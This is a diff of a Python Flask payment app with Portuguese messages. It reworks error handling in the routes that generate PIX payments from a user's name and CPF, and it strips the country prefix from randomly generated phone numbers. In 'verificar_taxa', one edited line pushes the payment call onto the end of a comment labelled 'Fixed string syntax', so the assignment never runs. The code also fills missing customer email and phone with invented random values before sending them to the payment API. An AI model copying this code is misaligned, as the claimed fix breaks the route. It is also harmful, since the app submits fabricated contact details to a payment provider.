@@ -648,41 +648,57 @@ def frete_apostila():
 
 @app.route('/pagamento_categoria', methods=['POST'])
 def pagamento_categoria():
-    user_data = session.get('dados_usuario') 
-    if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
-        return render_template('pagamento_categoria.html',
-                           error="Sessão expirada",
-                           current_year=datetime.now().year)
-
-    categoria = request.form.get('categoria')
-    if not categoria:
-        return render_template('pagamento_categoria.html',
-                           error="Categoria não especificada",
-                           current_year=datetime.now().year)
-
     try:
-        payment_api = create_payment_api()
-        payment_data = {
-            'name': user_data['nome_real'], 
-            'email': user_data.get('email', generate_random_email()), 
-            'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()), 
-            'amount': 114.10  
-        }
+        user_data = session.get('dados_usuario') 
+        if not user_data:
+            flash('Sessão expirada. Por favor, faça a consulta novamente.')
+            return render_template('pagamento_categoria.html',
+                               error="Sessão expirada",
+                               categoria='',
+                               current_year=datetime.now().year)
 
-        pix_data = payment_api.create_pix_payment(payment_data)
-        return render_template('pagamento_categoria.html',
-                           pix_data=pix_data,
-                           valor_total="114,10",
-                           categoria=categoria,
-                           current_year=datetime.now().year)
+        categoria = request.form.get('categoria')
+        if not categoria:
+            return render_template('pagamento_categoria.html',
+                               error="Categoria não especificada",
+                               categoria='',
+                               current_year=datetime.now().year)
+
+        try:
+            payment_api = create_payment_api()
+            payment_data = {
+                'name': user_data['nome_real'], 
+                'email': user_data.get('email', generate_random_email()), 
+                'cpf': user_data['cpf'],
+                'phone': user_data.get('phone', generate_random_phone()), 
+                'amount': 114.10  
+            }
+
+            pix_data = payment_api.create_pix_payment(payment_data)
+
+            if not pix_data:
+                raise ValueError("Falha ao gerar dados do PIX")
+
+            return render_template('pagamento_categoria.html',
+                               pix_data=pix_data,
+                               valor_total="114,10",
+                               categoria=categoria,
+                               current_year=datetime.now().year)
+
+        except Exception as e:
+            logger.error(f"Erro ao gerar pagamento da categoria: {e}")
+            return render_template('pagamento_categoria.html',
+                               error=f"Erro ao gerar pagamento: {str(e)}",
+                               categoria=categoria,
+                               pix_data={}, 
+                               current_year=datetime.now().year)
 
     except Exception as e:
-        logger.error(f"Erro ao gerar pagamento da categoria: {e}")
+        logger.error(f"Erro geral na rota de pagamento categoria: {e}")
         return render_template('pagamento_categoria.html',
-                           error=f"Erro ao gerar pagamento: {str(e)}",
-                           categoria=categoria,
+                           error=f"Erro ao processar pagamento: {str(e)}",
+                           categoria='',
+                           pix_data={}, 
                            current_year=datetime.now().year)
 
 @app.route('/obrigado')
@@ -743,8 +759,7 @@ def verificar_taxa():
                     'amount': 82.10
                 }
 
-                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")
-                pix_data = payment_api.create_pix_payment(payment_data)
+                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")  # Fixed string syntax                pix_data = payment_api.create_pix_payment(payment_data)
                 logger.info(f"PIX data generated successfully: {pix_data}")
 
                 return render_template('taxa_pendente.html',
@@ -794,9 +809,6 @@ def pagamento_taxa():
                            error=f"Erro ao gerar pagamento: {str(e)}",
                            current_year=datetime.now().year)
 
-def generate_random_email():
-    return f"user_{random.randint(1,1000)}@example.com"
-
 def generate_random_phone() -> str:
     """
     Gera um número de telefone aleatório no formato brasileiro aceito pela API
@@ -804,7 +816,7 @@ def generate_random_phone() -> str:
     ddd = str(random.randint(11, 99))
     # Gera 8 dígitos para o número (sem o 9 na frente)
     numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
-    return f"55{ddd}{numero}"
+    return f"{ddd}{numero}"  # Removed 55 prefix as per API requirements
 
 def generate_random_email() -> str:
     """
